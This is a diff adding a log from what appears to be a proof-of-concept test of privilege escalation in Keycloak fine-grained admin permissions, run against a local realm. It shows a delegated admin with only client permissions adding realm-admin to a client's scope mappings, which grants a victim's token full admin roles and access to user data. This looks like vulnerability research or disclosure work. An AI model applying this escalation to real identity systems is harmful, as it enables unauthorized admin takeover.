@@ -1,0 +1,33 @@
+[setup] create realm k1fgap1 with adminPermissionsEnabled=true: HTTP 201
+[fgap] realm adminPermissionsEnabled = True
+[fgap] admin-permissions client uuid=4efb3ec3-c757-4d57-8a1c-8e4a2a37d887
+[fgap] resource-server resources: ['Clients', 'Groups', 'Organizations', 'Roles', 'Users']
+[fgap] resource-server scopes: ['delegate', 'delegate-members', 'impersonate', 'impersonate-members', 'manage', 'manage-group-membership', 'manage-members', 'manage-membership', 'manage-membership-of-members', 'map-role', 'map-role-client-scope', 'map-role-composite', 'map-roles', 'map-roles-client-scope', 'map-roles-composite', 'reset-password', 'view', 'view-members']
+[setup] realm-management uuid=315e44f0-14cc-4c7d-92f5-07897ba0b675
+[setup] realm roles app-user, plain-role, innocent-bundle(->manage-realm) created
+[setup] client portal (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP 204
+[setup] client portal2 (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP 204
+[setup] client deleg-app with role deleg-role created
+[setup] built-in client scope kc-admin-api id=96ab5362-0137-4973-afa4-d75300dc66c4
+[setup] victim granted realm-admin (by trusted admin): HTTP 204
+[setup] delegated holds NO admin roles: realm-management mappings=[], realm mappings=[{'id': 'dee503ee-89a6-457d-bdfa-f6f0d866baaa', 'name': 'default-roles-k1fgap1', 'description': '${role_default-roles}', 'composite': True, 'clientRole': False, 'containerId': '8044c0ed-31bd-487b-927c-5a11e936f8c9'}]
+[fgap] create user policy for delegated: HTTP 201 -> {'id': '4218ec70-97ba-4cc4-81a4-d3b8f6fd7f21', 'name': 'delegated-admin-user-policy', 'description': "FGAP user policy for user 'delegated'", 'type': 'user', 'logic': 'POSITIVE', 'decisionStrategy': 'UNANIMOUS', 'users': ['1ed057b6-0d12-4409-8239-1582bf505ce1']}
+[fgap] create scope permission on Clients resource ['view', 'manage', 'map-roles', 'map-roles-client-scope', 'map-roles-composite']: HTTP 201 -> {'id': '63cced85-ad8c-448a-9423-cea617c7466d', 'name': 'delegated-manage-clients', 'description': 'FGAP delegation: manage clients only', 'type': 'scope', 'policies': ['4218ec70-97ba-4cc4-81a4-d3b8f6fd7f21'], 'resources': ['8dfd7c12-f816-43c2-ae8e-57dcf243b02d'], 'scopes': ['0e5030d4-5ef0-4d70-a1d8-de2a7903f311', '8f27b64f-aede-4028-9c1d-444874d79103', '415f9d2f-79ba-4574-a507-4b01d9bc8de1', 'f1a00d0b-2f27-4894-9c21-fb6fec68969d', '80d33276-57d2-410f-896d-1437c6b68923'], 'logic': 'POSITIVE', 'decisionStrategy': 'UNANIMOUS', 'resourceType': 'Clients'}
+[fgap] delegated token resource_access: None
+[fgap-check] delegated GET /clients (FGAP view/manage on Clients): HTTP 200 (expect 200)
+[fgap-check] delegated GET /users (no Users permission granted): HTTP 403 (expect 403)
+[fgap-check] delegated GET /admin/realms/k1fgap1 (no realm permission): HTTP 403 (expect 403)
+[baseline] victim@portal realm-management roles: []; aud=None; scope=profile email
+[baseline] victim@portal token -> GET /admin/realms/k1fgap1/users: HTTP 401
+[legit] delegated assigns kc-admin-api client scope to portal: HTTP 204 
+[pre-attack] victim@portal realm-management roles: []; aud=http://127.0.0.1:8080/admin/realms/k1fgap1; scope=kc-admin-api profile email
+[pre-attack] victim@portal token (admin audience, roles still filtered) -> GET users: HTTP 403 (expect 403)
+[control] delegated adds realm-admin as composite child of deleg-role: HTTP 403 (expect 403) resp={'error': 'HTTP 403 Forbidden'}
+[probe] delegated adds PLAIN realm role plain-role to portal2 scope mappings: HTTP 403 resp={'error': 'HTTP 403 Forbidden'}
+[attack2] delegated adds composite innocent-bundle (child=manage-realm) to portal2 scope mappings: HTTP 403 resp={'error': 'HTTP 403 Forbidden'}
+[attack2] victim@portal2 realm-management roles now: []
+[attack1] delegated adds realm-admin to portal scope mappings: HTTP 204 resp=
+[attack1] victim@portal realm-management roles now: ['create-client', 'impersonation', 'manage-authorization', 'manage-clients', 'manage-events', 'manage-identity-providers', 'manage-organizations', 'manage-realm', 'manage-users', 'query-clients', 'query-groups', 'query-organizations', 'query-realms', 'query-users', 'realm-admin', 'view-authorization', 'view-clients', 'view-events', 'view-identity-providers', 'view-organizations', 'view-realm', 'view-users']
+[impact] victim@portal post-attack token -> GET /admin/realms/k1fgap1/users: HTTP 200 (entries: 2)
+[impact] usernames visible: ['delegated', 'victim']
+[impact] victim@portal post-attack token -> GET /admin/realms/k1fgap1: HTTP 200
